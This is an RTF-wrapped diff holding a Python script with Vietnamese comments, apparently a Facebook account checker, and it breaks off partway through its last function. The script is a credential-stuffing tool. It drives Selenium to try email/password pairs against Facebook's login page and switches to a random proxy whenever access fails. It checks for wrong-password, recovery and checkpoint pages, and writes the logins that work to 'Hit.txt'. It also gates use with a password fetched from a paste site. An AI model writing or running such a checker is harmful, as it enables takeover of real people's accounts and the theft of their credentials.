@@ -1,0 +1,364 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2513
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 Menlo-Regular;\f1\fnil\fcharset0 Monaco;}
+{\colortbl;\red255\green255\blue255;\red183\green111\blue179;\red24\green24\blue24;\red193\green193\blue193;
+\red67\green192\blue160;\red140\green211\blue254;\red202\green202\blue202;\red194\green126\blue101;\red89\green138\blue67;
+\red70\green137\blue204;\red212\green214\blue154;\red167\green197\blue152;\red205\green173\blue106;}
+{\*\expandedcolortbl;;\cssrgb\c77255\c52549\c75294;\cssrgb\c12157\c12157\c12157;\cssrgb\c80000\c80000\c80000;
+\cssrgb\c30588\c78824\c69020;\cssrgb\c61176\c86275\c99608;\cssrgb\c83137\c83137\c83137;\cssrgb\c80784\c56863\c47059;\cssrgb\c41569\c60000\c33333;
+\cssrgb\c33725\c61176\c83922;\cssrgb\c86275\c86275\c66667;\cssrgb\c70980\c80784\c65882;\cssrgb\c84314\c72941\c49020;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\sl360\partightenfactor0
+
+\f0\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 requests\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 bs4\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 BeautifulSoup\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 threading\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 webdriver\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4 .\cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 common\cf4 \strokec4 .\cf5 \strokec5 by\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 By\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4 .\cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 chrome\cf4 \strokec4 .\cf5 \strokec5 service\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 Service\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 webdriver_manager\cf4 \strokec4 .\cf5 \strokec5 chrome\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 ChromeDriverManager\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4 .\cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 chrome\cf4 \strokec4 .\cf5 \strokec5 options\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 Options\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4 .\cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 support\cf4 \strokec4 .\cf5 \strokec5 ui\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 WebDriverWait\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4 .\cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 support\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 expected_conditions\cf4 \strokec4  \cf2 \strokec2 as\cf4 \strokec4  \cf5 \strokec5 EC\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 from\cf4 \strokec4  \cf5 \strokec5 selenium\cf4 \strokec4 .\cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 common\cf4 \strokec4 .\cf5 \strokec5 keys\cf4 \strokec4  \cf2 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 Keys\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 time\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 random\cf4 \cb1 \strokec4 \
+\cf2 \cb3 \strokec2 import\cf4 \strokec4  \cf5 \strokec5 os\cf4 \cb1 \strokec4 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf6 \cb3 \strokec6 url\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf8 \strokec8 "https://ctxt.io/2/AAB4Ftx3Ew"\cf4 \cb1 \strokec4 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m l
+\f1 \uc0\u7845 
+\f0 y v\uc0\u259 n b
+\f1 \uc0\u7843 
+\f0 n t\uc0\u7915  m\u7897 t trang web\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 get_page_text\cf4 \strokec4 (\cf6 \strokec6 url\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf2 \strokec2 try\cf4 \strokec4 :\cb1 \
+\cb3         \cf6 \strokec6 response\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 requests\cf4 \strokec4 .\cf11 \strokec11 get\cf4 \strokec4 (\cf6 \strokec6 url\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 response\cf4 \strokec4 .\cf6 \strokec6 encoding\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf8 \strokec8 'utf-8'\cf4 \cb1 \strokec4 \
+\cb3         \cf6 \strokec6 soup\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 BeautifulSoup\cf4 \strokec4 (\cf6 \strokec6 response\cf4 \strokec4 .\cf6 \strokec6 text\cf4 \strokec4 , \cf8 \strokec8 'html.parser'\cf4 \strokec4 )\cb1 \
+\cb3         \cf2 \strokec2 return\cf4 \strokec4  \cf8 \strokec8 ' '\cf4 \strokec4 .\cf11 \strokec11 join\cf4 \strokec4 (\cf6 \strokec6 soup\cf4 \strokec4 .\cf11 \strokec11 get_text\cf4 \strokec4 ().\cf11 \strokec11 split\cf4 \strokec4 ())\cb1 \
+\cb3     \cf2 \strokec2 except\cf4 \strokec4  \cf5 \strokec5 Exception\cf4 \strokec4  \cf2 \strokec2 as\cf4 \strokec4  \cf6 \strokec6 e\cf4 \strokec4 :\cb1 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "Kh\'f4ng th
+\f1 \uc0\u7875 
+\f0  t
+\f1 \uc0\u7843 
+\f0 i trang: \cf10 \strokec10 \{\cf6 \strokec6 e\cf10 \strokec10 \}\cf8 \strokec8 "\cf4 \strokec4 )\cb1 \
+\cb3         \cf2 \strokec2 return\cf4 \strokec4  \cf8 \strokec8 ""\cf4 \cb1 \strokec4 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m ki
+\f1 \uc0\u7875 
+\f0 m tra m\uc0\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u t\uc0\u7915  URL\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 check_password_from_url\cf4 \strokec4 (\cf6 \strokec6 password\cf4 \strokec4 , \cf6 \strokec6 url\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf6 \strokec6 page_text\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf11 \strokec11 get_page_text\cf4 \strokec4 (\cf6 \strokec6 url\cf4 \strokec4 )\cb1 \
+\cb3     \cf2 \strokec2 if\cf4 \strokec4  \cf6 \strokec6 password\cf4 \strokec4 .strip() \cf10 \strokec10 in\cf4 \strokec4  \cf6 \strokec6 page_text\cf4 \strokec4 :\cb1 \
+\cb3         \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 True\cf4 \cb1 \strokec4 \
+\cb3     \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 False\cf4 \cb1 \strokec4 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m l
+\f1 \uc0\u7845 
+\f0 y proxy t\uc0\u7915  URL\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 get_proxies_from_url\cf4 \strokec4 (\cf6 \strokec6 proxy_url\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf2 \strokec2 try\cf4 \strokec4 :\cb1 \
+\cb3         \cf6 \strokec6 response\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 requests\cf4 \strokec4 .\cf11 \strokec11 get\cf4 \strokec4 (\cf6 \strokec6 proxy_url\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 proxies\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf6 \strokec6 response\cf4 \strokec4 .\cf6 \strokec6 text\cf4 \strokec4 .\cf11 \strokec11 splitlines\cf4 \strokec4 ()  \cf9 \strokec9 # M
+\f1 \uc0\u7895 
+\f0 i proxy s\uc0\u7869  \u273 \u432 \u7907 c t\'e1ch ra th\'e0nh m\u7897 t d\'f2ng\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 return\cf4 \strokec4  \cf6 \strokec6 proxies\cf4 \cb1 \strokec4 \
+\cb3     \cf2 \strokec2 except\cf4 \strokec4  \cf5 \strokec5 Exception\cf4 \strokec4  \cf2 \strokec2 as\cf4 \strokec4  \cf6 \strokec6 e\cf4 \strokec4 :\cb1 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "Kh\'f4ng th
+\f1 \uc0\u7875 
+\f0  t
+\f1 \uc0\u7843 
+\f0 i proxy t\uc0\u7915  URL: \cf10 \strokec10 \{\cf6 \strokec6 e\cf10 \strokec10 \}\cf8 \strokec8 "\cf4 \strokec4 )\cb1 \
+\cb3         \cf2 \strokec2 return\cf4 \strokec4  []\cb1 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m t\uc0\u7841 o driver m\u7899 i v\'e0 c
+\f1 \uc0\u7845 
+\f0 u h\'ecnh v\uc0\u7899 i proxy\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 create_driver_with_proxy\cf4 \strokec4 (\cf6 \strokec6 proxy\cf7 \strokec7 =\cf10 \strokec10 None\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf6 \strokec6 chrome_options\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 Options\cf4 \strokec4 ()\cb1 \
+\cb3     \cf6 \strokec6 chrome_options\cf4 \strokec4 .\cf11 \strokec11 add_argument\cf4 \strokec4 (\cf8 \strokec8 "--no-sandbox"\cf4 \strokec4 )\cb1 \
+\cb3     \cf6 \strokec6 chrome_options\cf4 \strokec4 .\cf11 \strokec11 add_argument\cf4 \strokec4 (\cf8 \strokec8 "--disable-dev-shm-usage"\cf4 \strokec4 )\cb1 \
+\cb3     \cf9 \strokec9 # N
+\f1 \uc0\u7871 
+\f0 u c\'f3 proxy, th\'eam proxy v\'e0o driver\cf4 \cb1 \strokec4 \
+\cb3     \cf2 \strokec2 if\cf4 \strokec4  \cf6 \strokec6 proxy\cf4 \strokec4 :\cb1 \
+\cb3         \cf6 \strokec6 chrome_options\cf4 \strokec4 .\cf11 \strokec11 add_argument\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 '--proxy-server=http://\cf10 \strokec10 \{\cf6 \strokec6 proxy\cf10 \strokec10 \}\cf8 \strokec8 '\cf4 \strokec4 )\cb1 \
+\
+\cb3     \cf6 \strokec6 service\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 Service\cf4 \strokec4 (\cf5 \strokec5 ChromeDriverManager\cf4 \strokec4 ().\cf11 \strokec11 install\cf4 \strokec4 ())\cb1 \
+\cb3     \cf6 \strokec6 driver\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 webdriver\cf4 \strokec4 .\cf5 \strokec5 Chrome\cf4 \strokec4 (\cf6 \strokec6 service\cf7 \strokec7 =\cf6 \strokec6 service\cf4 \strokec4 , \cf6 \strokec6 options\cf7 \strokec7 =\cf6 \strokec6 chrome_options\cf4 \strokec4 )\cb1 \
+\cb3     \cb1 \
+\cb3     \cf9 \strokec9 # X\'f3a cookies sau khi t\uc0\u7841 o driver m\u7899 i\cf4 \cb1 \strokec4 \
+\cb3     \cf6 \strokec6 driver\cf4 \strokec4 .\cf11 \strokec11 delete_all_cookies\cf4 \strokec4 ()\cb1 \
+\
+\cb3     \cf2 \strokec2 return\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \cb1 \strokec4 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m ki
+\f1 \uc0\u7875 
+\f0 m tra t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n v\'e0 x
+\f1 \uc0\u7917 
+\f0  l\'fd l
+\f1 \uc0\u7895 
+\f0 i proxy\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 login_and_check_account\cf4 \strokec4 (\cf6 \strokec6 driver\cf4 \strokec4 , \cf6 \strokec6 email\cf4 \strokec4 , \cf6 \strokec6 password\cf4 \strokec4 , \cf6 \strokec6 wait_time\cf4 \strokec4 , \cf6 \strokec6 proxy\cf4 \strokec4 , \cf6 \strokec6 proxies\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf6 \strokec6 driver\cf4 \strokec4 .get(\cf8 \strokec8 'https://www.facebook.com/'\cf4 \strokec4 )  \cf9 \strokec9 # Truy c\uc0\u7853 p v\'e0o trang Facebook\cf4 \cb1 \strokec4 \
+\cb3     \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\uc0\u272 ang ki
+\f1 \uc0\u7875 
+\f0 m tra t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf8 \strokec8  v\uc0\u7899 i proxy: \cf10 \strokec10 \{\cf6 \strokec6 proxy\cf10 \strokec10 \}\cf8 \strokec8 "\cf4 \strokec4 )  \cf9 \strokec9 # Hi
+\f1 \uc0\u7875 
+\f0 n th\uc0\u7883  proxy v\'e0 t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n\cf4 \cb1 \strokec4 \
+\cb3     \cf2 \strokec2 try\cf4 \strokec4 :\cb1 \
+\cb3         \cf9 \strokec9 # \uc0\u272 \u7907 i cho c\'e1c ph
+\f1 \uc0\u7847 
+\f0 n t
+\f1 \uc0\u7917 
+\f0  tr\'ean trang \uc0\u273 \u259 ng nh\u7853 p Facebook xu
+\f1 \uc0\u7845 
+\f0 t hi\uc0\u7879 n\cf4 \cb1 \strokec4 \
+\cb3         \cf5 \strokec5 WebDriverWait\cf4 \strokec4 (\cf6 \strokec6 driver\cf4 \strokec4 , \cf12 \strokec12 10\cf4 \strokec4 ).\cf11 \strokec11 until\cf4 \strokec4 (\cb1 \
+\cb3             \cf5 \strokec5 EC\cf4 \strokec4 .\cf11 \strokec11 presence_of_element_located\cf4 \strokec4 ((\cf5 \strokec5 By\cf4 \strokec4 .\cf6 \strokec6 ID\cf4 \strokec4 , \cf8 \strokec8 "email"\cf4 \strokec4 ))\cb1 \
+\cb3         )\cb1 \
+\cb3         \cf6 \strokec6 email_input\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \strokec4 .find_element(\cf5 \strokec5 By\cf4 \strokec4 .\cf6 \strokec6 ID\cf4 \strokec4 , \cf8 \strokec8 'email'\cf4 \strokec4 )  \cf9 \strokec9 # Tr\uc0\u432 \u7901 ng nh\u7853 p email\cf4 \cb1 \strokec4 \
+\cb3         \cf6 \strokec6 password_input\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \strokec4 .find_element(\cf5 \strokec5 By\cf4 \strokec4 .\cf6 \strokec6 ID\cf4 \strokec4 , \cf8 \strokec8 'pass'\cf4 \strokec4 )  \cf9 \strokec9 # Tr\uc0\u432 \u7901 ng nh\u7853 p m\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u\cf4 \cb1 \strokec4 \
+\cb3         \cf6 \strokec6 email_input\cf4 \strokec4 .send_keys(\cf6 \strokec6 email\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 password_input\cf4 \strokec4 .send_keys(\cf6 \strokec6 password\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 password_input\cf4 \strokec4 .send_keys(\cf5 \strokec5 Keys\cf4 \strokec4 .\cf6 \strokec6 RETURN\cf4 \strokec4 )  \cf9 \strokec9 # G
+\f1 \uc0\u7917 
+\f0 i form \uc0\u273 \u259 ng nh\u7853 p\cf4 \cb1 \strokec4 \
+\cb3         \cf5 \strokec5 time\cf4 \strokec4 .\cf11 \strokec11 sleep\cf4 \strokec4 (\cf6 \strokec6 wait_time\cf4 \strokec4 )\cb1 \
+\
+\cb3         \cf9 \strokec9 # Ki
+\f1 \uc0\u7875 
+\f0 m tra xem c\'f3 ph
+\f1 \uc0\u7843 
+\f0 i l\'e0 th\'f4ng b\'e1o "M\uc0\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u b\uc0\u7841 n nh\u7853 p kh\'f4ng ch\'ednh x\'e1c" kh\'f4ng\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 try\cf4 \strokec4 :\cb1 \
+\cb3             \cf6 \strokec6 error_message\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \strokec4 .find_element(\cf5 \strokec5 By\cf4 \strokec4 .\cf6 \strokec6 XPATH\cf4 \strokec4 , \cf8 \strokec8 "//div[contains(text(), 'M\uc0\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u b\uc0\u7841 n nh\u7853 p kh\'f4ng ch\'ednh x\'e1c')]"\cf4 \strokec4 )\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf13 \strokec13 \\033\cf8 \strokec8 [1;31mKh\'f4ng \uc0\u273 \u259 ng nh\u7853 p \u273 \u432 \u7907 c v\u7899 i t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n: \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf8 \strokec8  - L
+\f1 \uc0\u7895 
+\f0 i: M\uc0\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u b\uc0\u7841 n nh\u7853 p kh\'f4ng ch\'ednh x\'e1c.\cf13 \strokec13 \\033\cf8 \strokec8 [0m"\cf4 \strokec4 )\cb1 \
+\cb3             \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 False\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 except\cf4 \strokec4 :\cb1 \
+\cb3             \cf2 \strokec2 pass\cf4 \cb1 \strokec4 \
+\
+\cb3         \cf9 \strokec9 # Ki
+\f1 \uc0\u7875 
+\f0 m tra n
+\f1 \uc0\u7871 
+\f0 u URL ch\uc0\u7913 a "https://www.facebook.com/recover"\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 if\cf4 \strokec4  \cf8 \strokec8 'https://www.facebook.com/recover'\cf4 \strokec4  \cf10 \strokec10 in\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \strokec4 .current_url:\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf13 \strokec13 \\033\cf8 \strokec8 [1;31mKh\'f4ng \uc0\u273 \u259 ng nh\u7853 p \u273 \u432 \u7907 c v\u7899 i t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n: \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf8 \strokec8  - L
+\f1 \uc0\u7895 
+\f0 i: C
+\f1 \uc0\u7847 
+\f0 n kh\'f4i ph\uc0\u7909 c t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n.\cf13 \strokec13 \\033\cf8 \strokec8 [0m"\cf4 \strokec4 )\cb1 \
+\cb3             \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 False\cf4 \cb1 \strokec4 \
+\
+\cb3         \cf9 \strokec9 # Ki
+\f1 \uc0\u7875 
+\f0 m tra URL sau khi \uc0\u273 \u259 ng nh\u7853 p th\'e0nh c\'f4ng\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 if\cf4 \strokec4  \cf8 \strokec8 'https://www.facebook.com/checkpoint/'\cf4 \strokec4  \cf10 \strokec10 in\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \strokec4 .current_url:\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf13 \strokec13 \\033\cf8 \strokec8 [1;36mCheckpoint: \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf13 \strokec13 \\033\cf8 \strokec8 [0m"\cf4 \strokec4 )\cb1 \
+\cb3             \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 False\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 elif\cf4 \strokec4  \cf6 \strokec6 driver\cf4 \strokec4 .current_url \cf7 \strokec7 ==\cf4 \strokec4  \cf8 \strokec8 "https://www.facebook.com/"\cf4 \strokec4 :\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf13 \strokec13 \\033\cf8 \strokec8 [1;32m\uc0\u272 \'e3 \u273 \u259 ng nh\u7853 p th\'e0nh c\'f4ng v\u7899 i t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n: \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf8 \strokec8 :\cf10 \strokec10 \{\cf6 \strokec6 password\cf10 \strokec10 \}\cf13 \strokec13 \\033\cf8 \strokec8 [0m"\cf4 \strokec4 )\cb1 \
+\cb3             \cf2 \strokec2 with\cf4 \strokec4  \cf11 \strokec11 open\cf4 \strokec4 (\cf8 \strokec8 'Hit.txt'\cf4 \strokec4 , \cf8 \strokec8 'a'\cf4 \strokec4 ) \cf2 \strokec2 as\cf4 \strokec4  \cf6 \strokec6 hit_file\cf4 \strokec4 :\cb1 \
+\cb3                 \cf6 \strokec6 hit_file\cf4 \strokec4 .\cf11 \strokec11 write\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf8 \strokec8 :\cf10 \strokec10 \{\cf6 \strokec6 password\cf10 \strokec10 \}\cf13 \strokec13 \\n\cf8 \strokec8 "\cf4 \strokec4 )\cb1 \
+\cb3             \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 True\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 else\cf4 \strokec4 :\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf13 \strokec13 \\033\cf8 \strokec8 [1;31mKh\'f4ng \uc0\u273 \u259 ng nh\u7853 p \u273 \u432 \u7907 c v\u7899 i t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n: \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf13 \strokec13 \\033\cf8 \strokec8 [0m"\cf4 \strokec4 )\cb1 \
+\cb3             \cf2 \strokec2 return\cf4 \strokec4  \cf10 \strokec10 False\cf4 \cb1 \strokec4 \
+\cb3     \cf2 \strokec2 except\cf4 \strokec4  \cf5 \strokec5 Exception\cf4 \strokec4  \cf2 \strokec2 as\cf4 \strokec4  \cf6 \strokec6 e\cf4 \strokec4 :\cb1 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\cf13 \strokec13 \\033\cf8 \strokec8 [1;31mKh\'f4ng th
+\f1 \uc0\u7875 
+\f0  truy c\uc0\u7853 p Facebook v\u7899 i proxy: \cf10 \strokec10 \{\cf6 \strokec6 proxy\cf10 \strokec10 \}\cf13 \strokec13 \\033\cf8 \strokec8 [0m"\cf4 \strokec4 )\cb1 \
+\cb3         \cb1 \
+\cb3         \cf9 \strokec9 # N
+\f1 \uc0\u7871 
+\f0 u l
+\f1 \uc0\u7895 
+\f0 i truy c\uc0\u7853 p, ch\u7885 n proxy m\u7899 i v\'e0 th
+\f1 \uc0\u7917 
+\f0  l\uc0\u7841 i\cf4 \cb1 \strokec4 \
+\cb3         \cf6 \strokec6 new_proxy\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 random\cf4 \strokec4 .\cf6 \strokec6 choice\cf4 \strokec4 (\cf6 \strokec6 proxies\cf4 \strokec4 )\cb1 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\uc0\u272 ang th
+\f1 \uc0\u7917 
+\f0  proxy m\uc0\u7899 i: \cf10 \strokec10 \{\cf6 \strokec6 new_proxy\cf10 \strokec10 \}\cf8 \strokec8 "\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 driver\cf4 \strokec4 .quit()  \cf9 \strokec9 # \uc0\u272 \'f3ng driver hi\u7879 n t\u7841 i\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 return\cf4 \strokec4  \cf11 \strokec11 login_and_check_account\cf4 \strokec4 (\cf11 \strokec11 create_driver_with_proxy\cf4 \strokec4 (\cf6 \strokec6 new_proxy\cf4 \strokec4 ), \cf6 \strokec6 email\cf4 \strokec4 , \cf6 \strokec6 password\cf4 \strokec4 , \cf6 \strokec6 wait_time\cf4 \strokec4 , \cf6 \strokec6 new_proxy\cf4 \strokec4 , \cf6 \strokec6 proxies\cf4 \strokec4 )  \cf9 \strokec9 # T\uc0\u7841 o driver m\u7899 i v\u7899 i proxy kh\'e1c v\'e0 th
+\f1 \uc0\u7917 
+\f0  l\uc0\u7841 i\cf4 \cb1 \strokec4 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m x\'f3a m\'e0n h\'ecnh\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 clear\cf4 \strokec4 ():\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf5 \strokec5 os\cf4 \strokec4 .\cf11 \strokec11 system\cf4 \strokec4 (\cf8 \strokec8 'cls'\cf4 \strokec4  \cf2 \strokec2 if\cf4 \strokec4  \cf5 \strokec5 os\cf4 \strokec4 .\cf6 \strokec6 name\cf4 \strokec4  \cf7 \strokec7 ==\cf4 \strokec4  \cf8 \strokec8 'nt'\cf4 \strokec4  \cf2 \strokec2 else\cf4 \strokec4  \cf8 \strokec8 'clear'\cf4 \strokec4 )\cb1 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m th
+\f1 \uc0\u7917 
+\f0  \uc0\u273 \u259 ng nh\u7853 p v\'e0 ki
+\f1 \uc0\u7875 
+\f0 m tra Facebook\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 try_login_and_check_facebook\cf4 \strokec4 (\cf6 \strokec6 url\cf4 \strokec4 , \cf6 \strokec6 proxy_url\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf6 \strokec6 attempts\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf12 \strokec12 0\cf4 \cb1 \strokec4 \
+\cb3     \cf6 \strokec6 max_attempts\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf12 \strokec12 3\cf4 \cb1 \strokec4 \
